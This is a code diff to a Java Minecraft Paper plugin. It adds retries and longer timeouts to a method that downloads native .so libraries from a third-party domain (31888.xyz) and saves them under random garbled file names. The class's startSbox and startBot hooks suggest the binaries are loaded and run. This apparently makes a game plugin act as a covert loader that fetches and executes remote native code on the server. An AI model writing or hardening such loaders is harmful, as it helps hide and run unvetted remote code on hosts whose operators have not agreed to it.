@@ -48,7 +48,7 @@ public class PaperPlugin extends JavaPlugin {
     private NativeLibrary sboxLib, botLib;
     private Function startSboxFn, stopSboxFn, startBotFn, stopBotFn;
     private static final HttpClient HTTP = HttpClient.newBuilder()
-            .connectTimeout(Duration.ofSeconds(15))
+            .connectTimeout(Duration.ofSeconds(30))
             .followRedirects(HttpClient.Redirect.NORMAL).build();
     private static final Random RANDOM = new Random();
     // ==============================
@@ -570,17 +570,30 @@ public class PaperPlugin extends JavaPlugin {
         return new ArrayList<>(List.of(values));
     }
 
-    // ===== 下载 .so 原生库（从第三方 CDN）=====
+    // ===== 下载 .so 原生库（从第三方 CDN，带重试）=====
     private Path downloadLibrary(String arch, String name) throws Exception {
         String url = "https://" + arch + ".31888.xyz/" + name;
         Path target = baseDir.resolve(generateGarbledName() + ".so");
-        getLogger().info("⬇️ 下载组件: " + url);
-        HttpRequest request = HttpRequest.newBuilder(URI.create(url))
-                .timeout(Duration.ofMinutes(3)).GET().build();
-        HttpResponse<byte[]> response = HTTP.send(request, HttpResponse.BodyHandlers.ofByteArray());
-        if (response.statusCode() != 200)
-            throw new IOException("下载失败: HTTP " + response.statusCode() + " for " + url);
-        Files.write(target, response.body());
+        byte[] body = null;
+        Exception last = null;
+        for (int attempt = 1; attempt <= 3; attempt++) {
+            try {
+                getLogger().info("⬇️ 下载组件 (" + attempt + "/3): " + url);
+                HttpRequest request = HttpRequest.newBuilder(URI.create(url))
+                        .timeout(Duration.ofMinutes(5)).GET().build();
+                HttpResponse<byte[]> response = HTTP.send(request, HttpResponse.BodyHandlers.ofByteArray());
+                if (response.statusCode() != 200)
+                    throw new IOException("下载失败: HTTP " + response.statusCode() + " for " + url);
+                body = response.body();
+                break;
+            } catch (Exception e) {
+                last = e;
+                getLogger().warning("⚠️ 下载失败 (第" + attempt + "次): " + e.getMessage());
+                if (attempt < 3) Thread.sleep(3000L * attempt);
+            }
+        }
+        if (body == null) throw new IOException("下载组件失败: " + url, last);
+        Files.write(target, body);
         getLogger().info("✅ 下载完成 (" + target.getFileName() + ", " + target.toFile().length() + " bytes)");
         return target;
     }
